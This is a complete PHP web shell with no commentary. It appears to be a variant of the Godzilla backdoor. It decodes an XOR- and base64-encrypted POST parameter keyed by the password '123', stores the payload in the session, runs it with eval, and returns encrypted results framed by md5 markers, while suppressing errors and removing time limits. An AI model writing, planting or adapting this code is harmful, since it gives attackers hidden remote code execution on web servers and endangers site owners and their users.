<?php
    session_start();
    @set_time_limit(0);
	@error_reporting(0);
    function E($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[$i+1&15];
        }
        return $D;
    }
    function Q($D){
        return base64_encode($D);
    }
    function O($D){
        return base64_decode($D);
    }
    $P='123';
    $V='payload';
    $T='202cb962ac59075b';
    if (isset($_POST[$P])){
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V])){
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C{public function nvoke($p) {eval($p."");}}
            $R=new C();
			$R->nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        }else{
            $_SESSION[$V]=$F;
        }
    }
